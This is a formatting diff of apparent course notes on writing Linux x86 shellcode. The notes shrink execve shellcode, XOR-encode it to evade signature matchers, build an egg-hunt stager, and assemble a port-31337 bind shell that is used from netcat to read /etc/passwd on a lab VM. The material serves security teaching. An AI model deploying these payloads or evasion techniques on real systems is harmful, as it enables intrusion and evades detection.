@@ -1,7 +1,6 @@
 # Unit 4: Shell Code Variations
 
-Reducing the Size of Shell Code
-===============================
+# Reducing the Size of Shell Code
 
 Shell code has three main properties: (1) it executes a system call to
 open a shell or do some other action; (2) it does not contain null
@@ -38,13 +37,12 @@ dowork:
 callback:
      call dowork        ; Pushes the address of "/bin/sh" onto the stack
      db "/bin/sh",0     ; The program we want to run - "/bin/sh"
-
 ```
 
 To see it's current size, let's compile and use the hexify program to
 count the number of bytes:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ nasm -g -f elf -o long_shell.o long_shell.asm
 user@si485H-base:demo$ ld  -o long_shell long_shell.o
 user@si485H-base:demo$ ./hexify.sh long_shell
@@ -57,14 +55,13 @@ That may seem ok: 37 bytes is pretty short. We can do better, though,
 because the shorter the shell code the more easily we can drop it as a
 payload.
 
-Using the Stack More Effectively
---------------------------------
+## Using the Stack More Effectively
 
 Our first target for reducing the size the shell code is to remove the
 jmp-call back procedures. Let's look at the objdump of the code to see
 how many bytes are used:
 
-``` {.example}
+``` example
 08048060 <_start>:
  8048060: eb 16                 jmp    8048078 <callback>
 
@@ -139,7 +136,7 @@ Looking at this, we get the same effect of the jmp-call back to get a
 position free reference to the string "/bin/sh". Let;s take a look at
 the objdump to see how this changed things:
 
-``` {.example}
+``` example
 Disassembly of section .text:
 
 08048060 <_start>:
@@ -173,7 +170,7 @@ that's 14 byts. We gained nothing!
 
 Worse, let's see if this shell code actually works:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./push_shell_1 
 user@si485H-base:demo$ 
 ```
@@ -183,7 +180,7 @@ Fail.
 To figure out why this shell code doesn't work, we'll have to trace its
 execution in gdb.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gdb -q push_shell_1 
 Reading symbols from push_shell_1...done.
 (gdb) b _start
@@ -223,7 +220,7 @@ End of assembler dump.
 Looking at the stack at this point, things seem to be going okay. Let's
 take three steps:
 
-``` {.example}
+``` example
 (gdb) ni 3
 0x08048065 in _start ()
 (gdb) ds
@@ -320,7 +317,7 @@ Finally, we still have to NULL terminate the string, so we push onto the
 stack first zero byte. When it is all said and done, we get the
 following:
 
-``` {.example}
+``` example
        | 0x0 0x0 0x0 0x0 | 0x00000000
        | 'n' '/' 's' 's' | 0x68732f6e
  esp-> | '/' '/' 'b' 'i' | 0x69622f2f
@@ -332,7 +329,7 @@ string.
 
 Let's compile and see if this works:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ld  -o push_shell_2 push_shell_2.o
 user@si485H-base:demo$ ./push_shell_2 
 $ echo "It worked!"
@@ -342,15 +339,14 @@ $
 
 And, we can see how many bytes it is:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ printf `./hexify.sh push_shell_2` | wc -c
 34
 ```
 
 Woohoo! We saved 3 bytes.
 
-Removing Crud from the Shell Code
----------------------------------
+## Removing Crud from the Shell Code
 
 The next place to turn our frugal eyes upon is the extra bit of crud in
 the shell code. In particular, let's start by removing the `exit` system
@@ -378,7 +374,7 @@ indicating that you do not want any arguments at all, but `execve` is
 smart enough to fix this for you later. In fact, running this program
 works fine:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gcc small_execve.c   -o small_execve
 small_execve.c: In function ‘main’:
 small_execve.c:4:3: warning: null argument where non-null required (argument 2) [-Wnonnull]
@@ -413,7 +409,7 @@ _start:
 
 And we can compile and test:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ nasm -f elf smaller_shell.asm -o smaller_shell.o
 user@si485H-base:demo$ ld smaller_shell.o -o smaller_shell
 user@si485H-base:demo$ ./smaller_shell 
@@ -427,8 +423,7 @@ user@si485H-base:demo$ printf `./hexify.sh smaller_shell` | wc -c
 Now we are at 23 bytes! Wow, but believe it or not, we can still do 2
 bytes better.
 
-Zeroing Out Better
-------------------
+## Zeroing Out Better
 
 The last place to gain an advantage, and it is a small one is in the
 process of zeroing bytes. There are a number of instructions that are
@@ -438,7 +433,7 @@ instruction we will concern ourselves with is the `mul` instruction.
 
 The `mul` instruction has the following form:
 
-``` {.example}
+``` example
    mul reg
 ```
 
@@ -484,7 +479,7 @@ value in `eax` by zero and store zero in both `eax` and `edx`.
 
 We can show that this shell code does work and see how many bytes it is:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ nasm -f elf smallest_shell.asm -o smallest_shell.o
 user@si485H-base:demo$ ld smallest_shell.o -o smallest_shell
 user@si485H-base:demo$ ./smallest_shell 
@@ -498,11 +493,9 @@ user@si485H-base:demo$ printf `./hexify.sh smallest_shell` | wc -c
 We are now at 21 bytes! And, that's about as small as it can get. I
 haven't seen any examples much smaller than this that work consistently.
 
-Shell Code Hiding
-=================
+# Shell Code Hiding
 
-Signature Matching Defenses
----------------------------
+## Signature Matching Defenses
 
 Continuing our discussion of advanced shell code. In the last class we
 reduced the size of our shell code from 37 bytes to 21, but sometimes it
@@ -546,7 +539,7 @@ needed for our shell code.
 As you can see, in our 21 byte shell code, we are going to have a
 problem getting passed the signature:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./sig_matcher $(printf `./hexify.sh smallest_shell`)
 No way Jose!
 ```
@@ -616,8 +609,7 @@ followed by an `int 0x80` at some point later. This signature is,
 clearly, a lot harder to defeat with the shell code we've been using so
 far. What to do?!
 
-Obfuscating Shell Code
-----------------------
+## Obfuscating Shell Code
 
 In the community, it is generally considered that signature matching
 schemes can be easily defeated with *obfuscated* and *polymorphic* shell
@@ -638,7 +630,7 @@ call to `esp` (or a jmp).
 
 Here are the bytes to our small shell code from objdump:
 
-``` {.example}
+``` example
 8048060:    31 c9                   xor    ecx,ecx
  8048062:   f7 e1                   mul    ecx
  8048064:   50                      push   eax
@@ -654,7 +646,7 @@ that I can push onto the stack. I've written a script to do this
 `le-foourbyte.py` and is provided in the classed tools directory. Here's
 an example of using it on this shell code:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py -
 0xe1f7c931
 0x2f6e6850
@@ -671,7 +663,7 @@ Now, to use this in another version of the shell code, we will want push
 in reverse order, and we can use the `tac` command (`cat` backwards) to
 print this in reverse:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py - | tac
 0x90909080
 0xcd0bb0e3
@@ -700,14 +692,14 @@ _start:
 And now, we pass the simple sigchecks from before because we split up
 the `int 0x80` instruction bytes.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./execve_sigmatcher $(printf `./hexify.sh push_shell`)
 $
 ```
 
 But, surprisingly, we still fail the more naive checking for "sh"
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./simple_sigmatcher $(printf `./hexify.sh push_shell`)
 No way Jose!
 ```
@@ -726,7 +718,7 @@ I don't see any 0xFF in the shell code, so we will use that as the key,
 essentially inverting the bytes. The `le-fourbytes.py` script will do
 this too:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ printf $(./hexify.sh smallest_shell) | ./le-fourbytes.py - 0xFF | tac
 0x6f6f6f7f
 0x32f44f1c
@@ -777,14 +769,14 @@ In total, this shell code is one part pushing on the encoded shell code
 and one part decoding that shell code. Once the shell code is decoded,
 we can call `esp` and execute the shell code.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./encoded_shell 
 $
 ```
 
 And this will pass all our signature matchers:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./simple_sigmatcher $(printf `./hexify.sh encoded_shell`)
 $ 
 user@si485H-base:demo$ ./execve_sigmatcher $(printf `./hexify.sh encoded_shell`)
@@ -797,8 +789,7 @@ and then they can write signatures for that, and we obfuscate again, and
 then more signatures, etc. This is why a signature scheme will always
 fail in the long run.
 
-Egg-Hunt Shell Code
--------------------
+## Egg-Hunt Shell Code
 
 Let's consider another technique for subverting signature matching
 scheme called the *egg hunt*. In the egg hunt, we consider a scenario
@@ -850,7 +841,6 @@ _start:
     mov ebx,esp         ; Param #1 - "/bin/sh" is *esp
     mov al,0xb          ; System call number for execve
     int 0x80        ; Interrupt 80 hex - invoke system call
-
 ```
 
 The reason it must apear in duplicate is that the egg hunt shell code
@@ -882,7 +872,7 @@ exactly the right tool for this job.
 Normally, `access` will check if you have access to the specified file.
 Here' is the manual description:
 
-``` {.example}
+``` example
 SYNOPSIS
        #include <unistd.h>
 
@@ -897,7 +887,7 @@ We hand it a path name as a reference to a string, an address, and the
 operating system will dereference that address. If the address is not
 accesible, the system call will fail with `EFAULT`
 
-``` {.example}
+``` example
 EFAULT pathname points outside your accessible address space.
 ```
 
@@ -949,15 +939,16 @@ int main(int argc, char *argv[]){
 
 And if we run this dummy code like so:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./dummy_hunt $(printf $(./hexify.sh huntable_shell))
 ```
 
-The huntable~shell~ is a command line argument, which means it is loaded
-into the memory of the program. The egg hunter will find the shell code,
-eventually, and drop us into the shell. How long does it take?
+The huntable<sub>shell</sub> is a command line argument, which means it
+is loaded into the memory of the program. The egg hunter will find the
+shell code, eventually, and drop us into the shell. How long does it
+take?
 
-``` {.example}
+``` example
 user@si485H-base:demo$ time ./dummy_hunt $(printf $(./hexify.sh huntable_shell)) < /dev/null
 
 real    0m9.038s
@@ -1007,15 +998,15 @@ j2: inc edx,        ; move by 1
 Now, we can use our dummy exploit, with our egg hunt shell code and our
 huntable shell code to see it work together:
 
-``` {.example}
+``` example
 ./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell))
 ```
 
-The first argument will be executed by the dummy~exploit~ program, which
-will find the huntable shell code, the second argument. How long does it
-take?
+The first argument will be executed by the dummy<sub>exploit</sub>
+program, which will find the huntable shell code, the second argument.
+How long does it take?
 
-``` {.example}
+``` example
 user@si485H-base:demo$ time ./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell)) < /dev/null
 
 real    0m10.775s
@@ -1026,7 +1017,7 @@ sys 0m7.192s
 Notice, most of that is the system call. And, if you run this with
 strace, you can see that happening.
 
-``` {.example}
+``` example
 user@si485H-base:demo$  strace -e raw=access ./dummy_exploit $(printf $(./hexify.sh egg_hunt)) $(printf $(./hexify.sh huntable_shell))
 ccess(0x8ed2004, 0)                    = -1 (errno 14)
 access(0x8ed3004, 0)                    = -1 (errno 14)
@@ -1061,7 +1052,7 @@ access(0x8eec004, 0)                    = -1 (errno 14)
 Pausing ... this is moving at the page boundary, every 4096 bytes. This
 region of memory is not accessible, but eventually ...
 
-``` {.example}
+``` example
 (...)
 ccess(0xb7e38d2c, 0)                   = -1 (errno 2)
 access(0xb7e38d2d, 0)                   = -1 (errno 2)
@@ -1099,11 +1090,9 @@ You get a region of memory that is accessible, and then you move 1 byte
 at a type through it checking for the egg. Finally, at some point you
 find that egg, and you eat it ---- I mean you execute the shell.
 
-C Based Remote Shells
-=====================
+# C Based Remote Shells
 
-Socket Programming in C
------------------------
+## Socket Programming in C
 
 This lesson is all about writing shell code that create a listening port
 on the remote machine that when connected to, provides shell access to
@@ -1132,7 +1121,7 @@ Next the type describes what high-level protocol should be used to
 communicate on the socket. The two main varieties for types is
 `SOCK_STREAM` for `TCP/IP` sockets and `SOCK_DGRAM` for `UDP` sockets.
 Remote shells need reliable, session based communication, and thus we
-will use SOCK~STREAM~.
+will use SOCK<sub>STREAM</sub>.
 
 Finally the protocol refers to type specific protocol settings: We will
 not use this and set this value to 0.
@@ -1187,9 +1176,9 @@ Two important points about the address structure: (1) note that the port
 is stored in network byte order (not Little Endian) and we need to use
 `htnos()` to cover the order, and this is also the same for the
 `in_addr` portion; (2) there is a lot of padding in the structure, but
-the core parts, sin~family~, sin~port~ and sin~addr~ will be 2 + 2 + 4
-or 8 bytes in size, and with the padding of 8 bytes, the total structure
-is 16 bytes.
+the core parts, sin<sub>family</sub>, sin<sub>port</sub> and
+sin<sub>addr</sub> will be 2 + 2 + 4 or 8 bytes in size, and with the
+padding of 8 bytes, the total structure is 16 bytes.
 
 Initializing the server address and then binding to it looks like such:
 
@@ -1289,8 +1278,7 @@ listened for incoming connection, and accepted the connection with a new
 socket ready for reading and writing. The last thing to do use this to
 create a remote shell
 
-Remote Shell in C
------------------
+## Remote Shell in C
 
 Consider for a second what is a remote shell? We use ssh a lot for our
 remote shells, and it is a secure shell, but what does it really mean?
@@ -1386,14 +1374,14 @@ int main(void){
 
 Now if I start the server on my local VM
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./rsh
 ```
 
-On my host computer, I can connect over netcat, and then type `cat
-/etc/passwd` and it will go give me what I desire!
+On my host computer, I can connect over netcat, and then type
+`cat /etc/passwd` and it will go give me what I desire!
 
-``` {.example}
+``` example
 [aviv@potbelly] 14 > netcat 192.168.56.101 31337
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -1436,11 +1424,9 @@ sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
 aviv:x:1001:1001:Adam Aviv,,,:/home/aviv:/bin/bash
 ```
 
-Assembly Based Remote Shells
-============================
+# Assembly Based Remote Shells
 
-The `socketcall()` system call
-------------------------------
+## The `socketcall()` system call
 
 \*The problem is: It's all been a lie!\*
 
@@ -1448,7 +1434,7 @@ It turns out that all the different system calls for sockets are not
 real. There is actually only ONE system call. the `socketcall()`. Here's
 the man page entry.
 
-``` {.example}
+``` example
 SYNOPSIS
        int socketcall(int call, unsigned long *args);
 
@@ -1464,7 +1450,7 @@ socketcall() there are two arguments, the call and the args. The call is
 an integer identifier for the socket function required. These are
 defined in the header file `net.h`:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ grep SYS_ /usr/include/linux/net.h 
 #define SYS_SOCKET  1       /* sys_socket(2)        */
 #define SYS_BIND    2       /* sys_bind(2)          */
@@ -1512,12 +1498,11 @@ takes. Putting this together, we can convert our call to `socket()` to a
 
     //...
   }
-
 ```
 
 But there's a problem. If we try to compile this code:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ make
 gcc -fno-stack-protector -z execstack -Wno-format-security -g    socketcall-example.c   -o socketcall-example
 /tmp/ccPCoZSR.o: In function `main':
@@ -1536,7 +1521,6 @@ int socketcall(int call, long * args){
   int res;
   res = syscall(SYS_socketcall, call, args);
 }
-
 ```
 
 Add that to the code, we can now compile, and convert the rest of our
@@ -1607,7 +1591,7 @@ int main(void){
 And if we run it through strace which will show us all the arguments to
 the system's call, we find that, yes, everything is as it should be:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ strace ./socketcall-rsh
 execve("./socketcall-rsh", ["./socketcall-rsh"], [/* 20 vars */]) = 0
 brk(0)                                  = 0x804b000
@@ -1619,8 +1603,7 @@ listen(3, 4)                            = 0
 accept(3, ...
 ```
 
-Converting Remote Shell to Assembly
------------------------------------
+## Converting Remote Shell to Assembly
 
 Now that everything is converted to `socketcall()`'s, we are still not
 done because we have consider how we might want to construct each of the
@@ -1658,18 +1641,17 @@ int main(){
   printf("IPPROTO_IP:%d\n",IPPROTO_IP);
 
 }
-
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./socket_args 
 PF_INET:2
 SOCK_STREAM:1
 IPPROTO_IP:0
 ```
 
-We also know that SYS~SOCKET~ is value 1, so we can follow the assembly
-code:
+We also know that SYS<sub>SOCKET</sub> is value 1, so we can follow the
+assembly code:
 
 ``` asm
 
@@ -1686,12 +1668,11 @@ code:
         mov al,0x66             ;SYS_SOCKETCALL                                         
 
         int 0x80
-
 ```
 
 And with strace, we can see that we got what we wanted:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ strace ./open_socket 
 execve("./open_socket", ["./open_socket"], [/* 20 vars */]) = 0
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
@@ -1716,9 +1697,9 @@ In c, we have:
   socketcall(SYS_BIND, (long *) bind_args);
 ```
 
-We know the value of SYS~BIND~, that's 2, but we need to think more
-about the `host_addr` portion of the address space. Fortunately, we can
-recall the structure from last lesson:
+We know the value of SYS<sub>BIND</sub>, that's 2, but we need to think
+more about the `host_addr` portion of the address space. Fortunately, we
+can recall the structure from last lesson:
 
 ``` c
 struct sockaddr_in {
@@ -1752,7 +1733,6 @@ We can write code to produce the `host_addr` like so:
     push WORD 0x697a    ;htonos(31337)
     push WORD 0x02      ;2
     mov ecx,esp
-
 ```
 
 This assembly is also introducing a new form of push that will only push
@@ -1785,7 +1765,7 @@ Now we can setup the rest of the code like so:
 
 And if we run it under strace, we see that it does call bind:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ strace ./bind_socket 
 execve("./bind_socket", ["./bind_socket"], [/* 20 vars */]) = 0
 bind(0, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 22) = -1 ENOTSOCK (Socket operation on non-socket)
@@ -1823,10 +1803,9 @@ tart:
     xor eax,eax
     mov al,0x66     ;SYS_SOCKETCALL
     int 0x80
-
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ strace ./listen_socket 
 execve("./listen_socket", ["./listen_socket"], [/* 20 vars */]) = 0
 listen(0, 5)                            = -1 ENOTSOCK (Socket operation on non-socket)
@@ -1871,7 +1850,7 @@ _start:
     int 0x80
 ```
 
-``` {.example}
+``` example
 execve("./accept_socket", ["./accept_socket"], [/* 20 vars */]) = 0
 accept(0, 0, NULL)                      = -1 ENOTSOCK (Socket operation on non-socket)
 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffa8} ---
@@ -1906,11 +1885,9 @@ stores our sockfd:
           xor eax,eax
           mov al, 0x3f
           int 0x80
-
 ```
 
-Putting it all together
------------------------
+## Putting it all together
 
 Now that we have all the parts, we can look at the entire assembly that
 actually goes ahead and executes a remote shell:
@@ -2018,7 +1995,7 @@ _start:
     int 0x80
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ strace ./assembly_rsh
 execve("./assembly_rsh", ["./assembly_rsh"], [/* 20 vars */]) = 0
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
@@ -2029,25 +2006,24 @@ accept(3, ...
 
 Then I can connect remotely:
 
-``` {.example}
+``` example
 [aviv@potbelly] 15 >netcat 192.168.56.101 31337
 ```
 
 Which will cause the accept() to complete:
 
-``` {.example}
+``` example
 (...)
 accept(3, 0, NULL)                      = 4
 dup2(4, 0)                              = 0
 dup2(4, 1)                              = 1
 dup2(4, 2)                              = 2
 execve("/bin//sh", [0], [/* 0 vars */]) = 0
-
 ```
 
 And on the remote server, I can now do as I please:
 
-``` {.example}
+``` example
 [aviv@potbelly] 15 >netcat 192.168.56.101 31337
 cat /etc/passwd 
 root:x:0:0:root:/root:/bin/bash
@@ -2096,7 +2072,7 @@ This shell code is significantly bigger than anything we've seen so far.
 That's because it takes a lot of effort of effort to open a remote
 shell. Right now, we are at 126 bytes.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ printf `./hexify.sh assembly_rsh` | wc -c
 126
 ```
